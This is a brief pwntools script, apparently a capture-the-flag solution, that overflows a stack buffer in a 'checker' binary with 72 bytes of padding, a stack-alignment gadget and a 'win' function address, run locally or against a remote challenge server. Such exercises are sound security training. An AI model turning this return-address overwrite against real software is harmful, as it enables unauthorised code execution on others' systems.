from pwn import *

context.arch = 'amd64'

# Set the log level to debug to see all the I/O

context.log_level = 'info' # Change to 'debug' for more verbosity


elf = ELF('./checker_patched')

if 'REMOTE' in args:
    r = remote('username-checker.challs.sekai.team', 1337)

else:
    r = process(elf.path)

payload = b'A' * (64+8)
payload += p64(0x0040101a)  # For stack alignment
win = p64(0x0000000000401236)

r.sendline(payload + win)

r.interactive()